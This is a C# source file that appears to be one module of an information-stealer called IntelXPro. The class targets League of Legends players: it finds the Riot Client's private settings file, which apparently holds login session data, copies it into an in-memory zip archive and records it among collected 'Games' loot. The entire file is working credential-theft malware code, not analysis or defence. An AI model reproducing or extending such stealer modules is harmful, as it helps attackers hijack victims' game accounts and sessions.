using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications.Games
{
    internal class LOL : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Riot Games", "Riot Client", "Data", "RiotClientPrivateSettings.yaml");
            if (File.Exists(text))
            {
                Counter.CounterApplications counterApplications = new Counter.CounterApplications();
                counterApplications.Name = "League of Legends";
                string text2 = "LeagueOfLegends\\RiotClientPrivateSettings.yaml";
                zip.AddFile(text2, File.ReadAllBytes(text));
                counterApplications.Files.Add(text + " => " + text2);
                counterApplications.Files.Add("LeagueOfLegends\\");
                counter.Games.Add(counterApplications);
            }
        }
    }
}
